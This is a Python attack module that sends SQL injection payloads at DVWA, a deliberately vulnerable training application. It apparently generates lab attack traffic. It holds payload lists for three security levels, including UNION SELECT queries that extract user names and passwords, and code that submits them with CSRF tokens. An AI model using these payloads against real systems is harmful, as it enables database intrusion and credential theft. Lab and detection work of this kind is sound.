"""SQL Injection attack against DVWA."""

import random
from .base import AttackModule, logger

SQLI_PAYLOADS_LOW = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "1' UNION SELECT null, version() #",
    "1' UNION SELECT user, password FROM users #",
    "1' UNION SELECT null, table_name FROM information_schema.tables #",
    "' OR ''='",
    "admin'--",
    "1 OR 1=1",
    "' UNION SELECT null, concat(user,':',password) FROM dvwa.users --",
]

SQLI_PAYLOADS_MEDIUM = [
    "1 OR 1=1",
    "1 UNION SELECT null, version()",
    "1 UNION SELECT user, password FROM users",
    "1 UNION SELECT null, table_name FROM information_schema.tables",
]

SQLI_PAYLOADS_HIGH = [
    "1' OR '1'='1",
    "1' UNION SELECT null,version() #",
    "1' UNION SELECT user,password FROM users #",
]


class SqlInjection(AttackModule):
    NAME = "sql_injection"

    def run_low(self, session):
        for payload in random.sample(SQLI_PAYLOADS_LOW, min(6, len(SQLI_PAYLOADS_LOW))):
            token = session.get_csrf_token("/vulnerabilities/sqli/")
            session.get(
                "/vulnerabilities/sqli/",
                params={"id": payload, "Submit": "Submit", "user_token": token},
            )
            logger.debug("[sqli] Payload: %s", payload)

    def run_medium(self, session):
        for payload in random.sample(SQLI_PAYLOADS_MEDIUM, min(3, len(SQLI_PAYLOADS_MEDIUM))):
            token = session.get_csrf_token("/vulnerabilities/sqli/")
            session.post(
                "/vulnerabilities/sqli/",
                data={"id": payload, "Submit": "Submit", "user_token": token},
            )

    def run_high(self, session):
        # High uses a separate session-input page
        for payload in SQLI_PAYLOADS_HIGH:
            session.post(
                "/vulnerabilities/sqli/session-input.php",
                data={"id": payload, "Submit": "Submit"},
            )
            session.get("/vulnerabilities/sqli/")
